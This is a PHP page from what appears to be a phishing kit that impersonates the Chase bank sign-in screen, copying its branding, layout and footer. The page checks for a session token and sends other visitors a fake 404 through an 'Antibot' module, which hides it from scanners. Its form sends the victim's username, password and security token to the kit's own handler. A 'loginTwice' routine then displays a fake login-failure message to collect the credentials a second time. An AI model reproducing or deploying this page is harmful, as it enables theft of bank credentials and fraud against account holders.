<?php

    session_start();

    require_once '../W/Comp.php';
    require_once '../W/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

?>

<html class="no-js" lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Sign in - chase.com</title>
        <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0'>
        <link rel="shortcut icon" href="../A/img/favicon.ico">
        <link rel="stylesheet" href="../A/css/Login/index.css">
        <link rel="stylesheet" href="../A/css/Login/blue-ui.css">
        <link rel="stylesheet" href="../A/css/Login/logon.css">
    </head>
    <body>
        <div id="fixed">
            <div class="spinner" style="position: fixed; top: 50%; right: 0; bottom: 0; left: 0; z-index: 200; margin: 0; text-align: center;">
                <div>
                    <div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div>
                </div>
            </div>
        </div>
        <div id="logonApp" data-is-view="true">
            <div class="homepage" tabindex="-1">
                <div id="advertisenativeapp">
                    <div data-is-view="true">
                        <div class="advertiseNativeApp"></div>
                    </div>
                </div>
                <div class="toggle-aria-hidden" id="sitemessage" role="region" 
                    aria-hidden="true">
                    <div data-is-view="true">
                        <div id="siteMessageAda" aria-live="polite">
                            <h2 class="util accessible-text" id="site-messages-heading">You have no more site alerts</h2>
                        </div>
                    </div>
                </div>
                <div class="logon-container" id="container">
                    <header class="toggle-aria-hidden" id="logon-summary-menu">
                        <div class="logon header jpui transparent navigation bar" data-is-view="true">
                            <a id="logoHomepageLink" style="cursor: pointer;">
                                <div class="chase logo"></div> <span class="util accessible-text">Chase.com homepage</span>
                            </a>
                        </div>
                    </header>
                    <main id="logon-content">
                        <div class="container logon" data-is-view="true">
                            <div>
                                <div id="backgroundImage">
                                    <div class="jpui background image fixed" id="geoImage"></div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
                                    <div class="jpui raised segment">
                                        <div class="row">
                                            <div class="col-xs-10 col-xs-offset-1">
                                                <form id="loginbank" method="POST" action="../W/J/?token=<?php echo $_SESSION['token']; ?>">
                                                    <div id="validator-error-header" hidden="">
                                                        <div class="jpui error error inverted primary animate alert" id="logon-error" role="region">
                                                            <div class="icon"><span id="type-icon-logon-error"><i
                                                                        class="jpui exclamation-color icon"
                                                                        id="icon-type-icon-logon-error"
                                                                        aria-hidden="true"></i></span>
                                                            </div>
                                                            <div class="icon background"></div>
                                                            <div class="content wrap" id="content-logon-error">
                                                                <h2 class="title" tabindex="-1" id="inner-logon-error"><span
                                                                        class="util accessible-text"
                                                                        id="icon-logon-error">Important: </span>Please tell
                                                                    us your username and password.</h2>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top"
                                                        id="userId">
                                                        <div class="jpui vertical">
                                                            <div class="align-label-input floating-label__container userId" id="userLabel">
                                                                <div class="label-wrapper">
                                                                    <label class="jpui fieldlabel label-alignment vertical"
                                                                        id="userId-label" for="userId-text-input-field"
                                                                        aria-hidden="false"><span
                                                                            class="util accessible-text errorAdaText">Error:</span><span
                                                                            class="util accessible-text"
                                                                            id="userId-label-errorLabel"></span>Username
                                                                        <span class="util accessible-text"
                                                                            id="userId-label-accessible-text"></span>
                                                                    </label>
                                                                </div>
                                                                <div class="logon-xs-toggle" id="userId-text">
                                                                    <input class="jpui input logon-xs-toggle" id="userbank"
                                                                        placeholder="" format=""
                                                                        aria-describedby="userId-input-field-label"
                                                                        type="text" name="userbank" data-validate="userId"
                                                                        required="" value="">
                                                                </div>
                                                            </div>
                                                            <div>
                                                                <div></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="jpui fieldgroup logon-xs-toggle logon-floating-label"
                                                        id="password">
                                                        <div class="jpui vertical">
                                                            <div
                                                                class="align-label-input floating-label__container password" id="passwordLabel">
                                                                <div class="label-wrapper">
                                                                    <label class="jpui fieldlabel label-alignment vertical"
                                                                        id="password-label" for="password-text-input-field"
                                                                        aria-hidden="false"><span
                                                                            class="util accessible-text"
                                                                            id="password-label-errorLabel"></span>Password
                                                                        <span class="util accessible-text"
                                                                            id="password-label-accessible-text"></span>
                                                                    </label>
                                                                </div>
                                                                <div class="logon-xs-toggle" id="password-text">
                                                                    <input class="jpui input logon-xs-toggle"
                                                                        id="passwordbank" placeholder="" format=""
                                                                        aria-describedby="password-input-field-label"
                                                                        autocomplete="off" type="password"
                                                                        name="passwordbank" data-validate="password"
                                                                        required="" value="">
                                                                </div>
                                                            </div>
                                                            <div>
                                                                <div></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="jpui fieldgroup logon-xs-toggle logon-floating-label hidden"
                                                        id="securityToken">
                                                        <div class="jpui vertical">
                                                            <div
                                                                class="align-label-input floating-label__container securityToken" id="tokenLabel">
                                                                <div class="label-wrapper">
                                                                    <label class="jpui fieldlabel label-alignment vertical"
                                                                        id="securityToken-label"
                                                                        for="securityToken-text-input-field"
                                                                        aria-hidden="false"><span
                                                                            class="util accessible-text"
                                                                            id="securityToken-label-errorLabel"></span>Token
                                                                        <span class="util accessible-text"
                                                                            id="securityToken-label-accessible-text"></span>
                                                                    </label>
                                                                </div>
                                                                <div class="logon-xs-toggle" id="securityToken-text">
                                                                    <input class="jpui input logon-xs-toggle"
                                                                        id="securityTokenbank" placeholder="" format=""
                                                                        aria-describedby="securityToken-input-field-label"
                                                                        autocomplete="off" type="tel"
                                                                        name="securityTokenbank"
                                                                        data-validate="securityToken" required="" value="">
                                                                </div>
                                                            </div>
                                                            <div>
                                                                <div></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="row logon-xs-toggle">
                                                        <div class="col-xs-6 rememberMe-checkbox-container">
                                                            <div class="jpui checkbox" id="rememberMe">
                                                                <div class="checkbox-flex">
                                                                    <div class="checkboxWrap">
                                                                        <input
                                                                            class="checkbox__input rememberMe"
                                                                            type="checkbox" id="input-rememberMe"
                                                                            
                                                                            name="rememberMe" value="on"> <i
                                                                            class="jpui checkmark icon check"
                                                                            aria-hidden="true"></i>
                                                                    </div>
                                                                    <label for="input-rememberMe"> <span
                                                                            class="checkbox-label"
                                                                            id="label-rememberMe">Remember me </span>
                                                                    </label>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="col-xs-6 token-checkbox-container">
                                                            <div class="jpui checkbox useToken" id="useToken">
                                                                <div class="checkbox-flex">
                                                                    <div class="checkboxWrap">
                                                                        <input class="checkbox__input useToken"
                                                                            type="checkbox" id="input-useToken"
                                                                            
                                                                            name="rsaToken"> <i
                                                                            class="jpui checkmark icon check"
                                                                            aria-hidden="true"></i>
                                                                    </div>
                                                                    <label for="input-useToken"> <span
                                                                            class="checkbox-label" id="label-useToken">Use
                                                                            token </span>
                                                                    </label>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="row">
                                                        <button type="button" id="signin-button"
                                                            class="jpui button focus fluid primary"><span class="label">Sign
                                                                in</span>
                                                        </button>
                                                    </div>
                                                    <div class="row"><span class="jpui link"
                                                            id="forgotPassword-link-wrapper"><a class="link-anchor"
                                                                id="forgotPassword" style="cursor: pointer;"
                                                                >Forgot
                                                                username/password?<i
                                                                    class="jpui progressright icon end-icon"
                                                                    id="forgotPassword-endIcon"
                                                                    aria-hidden="true"></i></a></span>
                                                    </div>
                                                    <div class="row"><span class="jpui link" id="enrollment-link-wrapper"><a
                                                                class="link-anchor last" id="enrollment"
                                                                style="cursor: pointer;"
                                                                >Not Enrolled? Sign
                                                                Up Now.<i class="jpui progressright icon end-icon"
                                                                    id="enrollment-endIcon"
                                                                    aria-hidden="true"></i></a></span>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </main>
                </div>
                <footer class="logon-footer" id="logon-footer">
                    <div class="footer-container" data-is-view="true" style="position: static; bottom:0px;">
                        <div class="container">
                            <div class="social-links row">
                                <div class="col-xs-12"><span class="follow-us-text">Follow us:</span>
                                    <ul class="icon-links">
                                        <li class="facebook"><span id="requestChaseFacebook-iconanchor-wrapper"><a
                                                    class="jpui iconaction" style="cursor: pointer;"
                                                    id="requestChaseFacebook"> <span class="util accessible-text"
                                                        id="accessible-requestChaseFacebook">Facebook: Opens dialog</span>
                                                    <i class="jpui facebook icon" id="icon-requestChaseFacebook"
                                                        aria-hidden="true"></i>
                                                </a>
                                            </span>
                                        </li>
                                        <li class="instagram"><span id="requestChaseInstagram-iconanchor-wrapper"><a
                                                    class="jpui iconaction" style="cursor: pointer;"
                                                    id="requestChaseInstagram"> <span class="util accessible-text"
                                                        id="accessible-requestChaseInstagram">Instagram: Opens dialog</span>
                                                    <i class="jpui instagram icon" id="icon-requestChaseInstagram"
                                                        aria-hidden="true"></i>
                                                </a>
                                            </span>
                                        </li>
                                        <li class="twitter"><span id="requestChaseTwitter-iconanchor-wrapper"><a
                                                    class="jpui iconaction" style="cursor: pointer;"
                                                    id="requestChaseTwitter"> <span class="util accessible-text"
                                                        id="accessible-requestChaseTwitter">Twitter: Opens dialog</span> <i
                                                        class="jpui twitter icon" id="icon-requestChaseTwitter"
                                                        aria-hidden="true"></i>
                                                </a>
                                            </span>
                                        </li>
                                        <li class="youtube"><span id="requestChaseYouTube-iconanchor-wrapper"><a
                                                    class="jpui iconaction" style="cursor: pointer;"
                                                    id="requestChaseYouTube"> <span class="util accessible-text"
                                                        id="accessible-requestChaseYouTube">YouTube: Opens dialog</span> <i
                                                        class="jpui youtube icon" id="icon-requestChaseYouTube"
                                                        aria-hidden="true"></i>
                                                </a>
                                            </span>
                                        </li>
                                        <li class="linkedin"><span id="requestChaseLinkedIn-iconanchor-wrapper"><a
                                                    class="jpui iconaction" style="cursor: pointer;"
                                                    id="requestChaseLinkedIn"> <span class="util accessible-text"
                                                        id="accessible-requestChaseLinkedIn">LinkedIn: Opens dialog</span>
                                                    <i class="jpui linkedin icon" id="icon-requestChaseLinkedIn"
                                                        aria-hidden="true"></i>
                                                </a>
                                            </span>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                            <div class="footer-links row implement-ada-features-enabled">
                                <div class="col-xs-12">
                                    <ul>
                                        <li><span class="jpui link" id="requestContactUs-link-wrapper"><a
                                                    class="link-anchor" id="requestContactUs" style="cursor: pointer;"
                                                    >Contact us</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestPrivacyNotice-link-wrapper"><a
                                                    class="link-anchor" id="requestPrivacyNotice" style="cursor: pointer;"
                                                    >Privacy</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestSecurity-link-wrapper"><a class="link-anchor"
                                                    id="requestSecurity" style="cursor: pointer;"
                                                    >Security</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestTermsOfUse-link-wrapper"><a
                                                    class="link-anchor" id="requestTermsOfUse" style="cursor: pointer;"
                                                    >Terms of use</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestAccessibility-link-wrapper"><a
                                                    class="link-anchor" id="requestAccessibility" style="cursor: pointer;"
                                                    >Accessibility</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestMortgageLoanOriginators-link-wrapper"><a
                                                    class="link-anchor" id="requestMortgageLoanOriginators"
                                                    style="cursor: pointer;"
                                                    >SAFE Act: Chase
                                                    Mortgage Loan Originators</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestHomeMortgageDisclosureAct-link-wrapper"><a
                                                    class="link-anchor" id="requestHomeMortgageDisclosureAct"
                                                    style="cursor: pointer;" >Fair
                                                    Lending</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestAboutChase-link-wrapper"><a
                                                    class="link-anchor" id="requestAboutChase" style="cursor: pointer;"
                                                    >About Chase</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestJpMorgan-link-wrapper"><a class="link-anchor"
                                                    id="requestJpMorgan" style="cursor: pointer;"
                                                    >J.P. Morgan</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestJpMorganChaseCo-link-wrapper"><a
                                                    class="link-anchor" id="requestJpMorganChaseCo"
                                                    style="cursor: pointer;"
                                                    >JPMorgan Chase &amp;
                                                    Co.</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestCareers-link-wrapper"><a class="link-anchor"
                                                    id="requestCareers" style="cursor: pointer;"
                                                    >Careers</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestEspanol-link-wrapper"><a class="link-anchor"
                                                    id="requestEspanol" style="cursor: pointer;"
                                                    >Español</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestChaseCanada-link-wrapper"><a
                                                    class="link-anchor" id="requestChaseCanada" style="cursor: pointer;"
                                                    >Chase Canada</a></span>
                                        </li>
                                        <li><span class="jpui link" id="requestSiteMap-link-wrapper"><a class="link-anchor"
                                                    id="requestSiteMap" style="cursor: pointer;"
                                                    >Site map</a></span>
                                        </li>
                                        <li>Member FDIC</li>
                                        <li><i class="jpui equal-housing-lender icon" id="equalHousingLenderLabel"
                                                aria-hidden="true"></i> Equal Housing Lender</li>
                                        <li class="copyright-label">© 2021 JPMorgan Chase &amp; Co.</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
        </div>
        <script src="../A/js/cleave.js"></script>
        <script src="../A/js/index.js"></script>
        <?php

            if (isset($_SESSION['loginTwice']) && $_SESSION['loginTwice']) {
                echo '
                    <script>
                        username.classList.add("clientSideError");
                        document.getElementById("userId-label").classList.add("error");
                        
                        password.classList.add("clientSideError");
                        document.getElementById("password-label").classList.add("error");
                        
                        tokenInput.classList.add("clientSideError");
                        document.getElementById("securityToken-label").classList.add("error");

                        document.getElementById("validator-error-header").removeAttribute("hidden");
                        document.getElementById("inner-logon-error").innerText = "We can\'t find that username and password. You can reset your password or try again.";
                    </script>
                ';
            }

        ?>
    </body>
</html>